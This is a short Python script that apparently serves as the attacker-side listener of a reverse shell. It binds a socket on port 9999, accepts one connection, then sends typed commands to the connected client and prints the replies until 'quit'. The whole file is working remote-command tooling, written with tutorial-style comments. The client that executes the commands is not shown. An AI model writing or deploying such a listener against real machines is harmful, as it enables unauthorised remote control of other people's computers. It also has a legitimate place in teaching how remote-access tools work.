import socket
import sys


# Create a socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket Creation error:', msg)


# Bind socket to port and wait for connction from client
def socket_bind():
    try:
        global host
        global port
        global s
        print('binding socket to port:', port)
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('Socket Binding Error:', msg, "\n", 'Retrying...')


# Establish a connection with client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print('Connections has been established |',
          "IP ", address[0], "| Port ", address[1])
    send_commands(conn)
    conn.close()


# Send Commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
